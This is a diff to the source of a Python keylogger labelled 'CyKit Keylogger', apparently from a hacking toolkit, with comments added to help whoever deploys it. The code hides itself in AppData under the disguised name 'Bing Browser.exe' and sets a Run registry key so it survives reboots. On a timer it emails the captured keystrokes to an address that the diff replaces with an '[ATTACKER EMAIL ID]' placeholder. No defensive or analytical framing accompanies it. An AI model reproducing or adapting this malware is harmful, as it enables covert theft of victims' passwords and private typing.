@@ -15,7 +15,7 @@ class Keylogger:
         self.mailer = send_mails.SendMails()
 
     def get_persistent(self):
-        file_location = os.environ["appdata"] + "\\Bing Browser.exe"
+        file_location = os.environ["appdata"] + "\\Bing Browser.exe"  # can name as some other process.
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Browser /t REG_SZ /d "' + file_location + '"', shell=True)
@@ -34,7 +34,7 @@ class Keylogger:
         self.log += string
 
     def report(self):
-        self.mailer.send_mail("hack3d.txt@gmail.com", "CyKit Keylogger Reports", self.log)
+        self.mailer.send_mail("[ATTACKER EMAIL ID]", "CyKit Keylogger Reports", self.log)
         # print(self.log)  # For testing purposes only
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
@@ -47,5 +47,5 @@ class Keylogger:
             keyboard_listener.join()
 
 
-cykitlogger = Keylogger(time_interval_seconds=300)
+cykitlogger = Keylogger(time_interval_seconds=300)  # Set time interval as per your choice.
 cykitlogger.start()
